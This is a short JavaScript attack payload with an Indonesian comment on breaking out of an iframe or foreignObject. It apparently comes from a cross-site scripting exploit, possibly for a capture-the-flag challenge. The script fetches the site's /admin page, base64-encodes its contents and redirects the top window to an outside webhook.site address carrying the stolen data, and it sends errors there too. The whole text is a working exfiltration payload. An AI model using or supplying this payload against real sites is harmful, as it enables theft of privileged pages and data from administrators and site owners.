// lebih kuat pakai top.location biar keluar dari iframe/foreignObject
fetch('/admin')
  .then(r => r.text())
  .then(t => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?data=' + btoa(t) })
  .catch(e => { top.location = 'https://webhook.site/f4b566c7-84f9-47fb-b385-611fe96486d1?err=' + encodeURIComponent(e) })
